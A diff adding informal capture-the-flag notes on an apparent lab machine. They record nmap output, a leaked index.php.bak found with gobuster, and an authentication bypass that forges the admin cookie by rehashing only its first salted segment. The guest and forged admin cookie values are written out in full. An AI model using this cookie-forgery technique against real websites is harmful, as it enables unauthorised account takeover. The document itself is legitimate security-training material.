@@ -1,0 +1,55 @@
+10.10.239.40
+
+Machine:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 57:2c:43:78:0c:d3:13:5b:8d:83:df:63:cf:53:61:91 (ECDSA)
+|_  256 45:e1:3c:eb:a6:2d:d7:c6:bb:43:24:7e:02:e9:11:39 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-server-header: Apache/2.4.59 (Debian)
+|_http-title: Did not follow redirect to /
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Http page which has this in view source:
+
+ <!-- TODO remember to remove .bak files-->
+
+
+found on gobuster: /index.php.bak
+
+has some very revealing info on the websites cookie functionality.
+
+in the code I saw that there was a serious flaw as each section of the cookie is split into 8 parts the cookie is validated 
+using a secret encryption key, which is hashe in the cookie for user 'guest'. So we can copy the code over and make our own version
+of the cookie and replace the parts that are actually being verified with the 'admin' user which gets us the first flag.
+
+For example: 
+
+Here is the guest cookie. Before it is hashed, it gets split into 8 parts. Dehashed it would look something like: 
+
+guest:Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0:SECRET_KEY
+
+or
+
+SALTguest:MoSALTzilla/5.SALT etc etc
+
+but looking at the code, the verification / login method only really checks the first part. and we know what the salt will be too.
+
+in that case we can copy the algo it uses to hash the cookie, use the salt (in this case its 'py') and replace the first part with a hashed verion of 'admin:Mo'.
+
+Here below are the two cookies. The first the 'guest' cookie and the second the 'admin' cookie which allows us to login. as you can see all i changed was the initial section which tricked the website.
+
+
+Guest:
+pyAqFdvAg%2FgYYpyhZjUWRf%2FScQpyXPWkipHrQJEpytV8LUyTagKopyg1UvHZICL9UpyfrO2He%2F8pWcpyUtxE6LnZjbMpybKBnZdvuPAUpyikmQdmlp2gspy%2FljadH9LJRUpyaItmgpLkK7wpyCSiazTltWIUpyOnK1rF%2FZSDkpyFYQVWL%2FcAWApygaPEuEMzxT.pymxSqmtRj6fMpy5BquonyVvYcpyLFn7Zgseo3Qpyd1DqBHSu5MQpyrzaVkpBoLeYpyGCGF3onLUPspyLRCWL5UCFaUpyMaazuOvCQnopyVv4AUYXboVYpyUXyzpZ87%2FF2pyVfxjqAatyA2pygs2fUdiqFKcpyBRMZj09OXzEpyOSRGwhZe8i2; user=guest
+
+
+admin:
+pyDVho8QDgv1MpyhZjUWRf%2FScQpyXPWkipHrQJEpytV8LUyTagKopyg1UvHZICL9UpyfrO2He%2F8pWcpyUtxE6LnZjbMpybKBnZdvuPAUpyikmQdmlp2gspy%2FljadH9LJRUpyaItmgpLkK7wpyCSiazTltWIUpyOnK1rF%2FZSDkpyFYQVWL%2FcAWApygaPEuEMzxT.pymxSqmtRj6fMpy5BquonyVvYcpyLFn7Zgseo3Qpyd1DqBHSu5MQpyrzaVkpBoLeYpyGCGF3onLUPspyLRCWL5UCFaUpyMaazuOvCQnopyVv4AUYXboVYpyUXyzpZ87%2FF2pyVfxjqAatyA2pygs2fUdiqFKcpyBRMZj09OXzEpyOSRGwhZe8i2; user=admin
+
+admin:Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+pyDVho8QDgv1MpyhZjUWRf%2FScQpyXPWkipHrQJEpytV8LUyTagKopyg1UvHZICL9UpyfrO2He%2F8pWcpyUtxE6LnZjbMpybKBnZdvuPAUpyikmQdmlp2gs
+
